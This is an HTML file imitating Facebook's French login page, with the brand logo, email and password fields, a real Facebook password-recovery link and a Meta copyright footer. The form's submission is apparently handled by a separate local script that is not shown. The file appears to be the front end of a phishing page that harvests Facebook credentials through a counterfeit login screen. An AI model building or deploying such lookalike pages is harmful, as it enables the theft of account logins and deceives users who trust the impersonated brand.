<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion ou inscription</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="logo">facebook</h1>
            <div class="language-selector">
                <select id="language">
                    <option value="fr">Français</option>
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
            </div>
        </div>

        <div class="content">
            <div class="login-container">
                <div class="login-box">
                    <form id="loginForm" class="login-form">
                        <input type="text" id="email" placeholder="Numéro mobile ou e-mail" required autocomplete="username">
                        <input type="password" id="password" placeholder="Mot de passe" required autocomplete="current-password">
                        <button type="submit" class="login-btn" id="loginBtn">Se connecter</button>
                        <div class="separator"></div>
                        <a href="https://m.facebook.com/login/identify" class="forgot-password">Mot de passe oublié ?</a>
                        <button type="button" class="create-account">Créer un compte</button>
                    </form>
                </div>
                
                <div class="create-page">
                    <a href="#" class="create-page-link">Créer une Page</a> pour une célébrité, un groupe ou une entreprise.
                </div>
            </div>
        </div>
    </div>

    <footer class="footer">
            <div class="meta-copyright">
                Meta © 2025
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
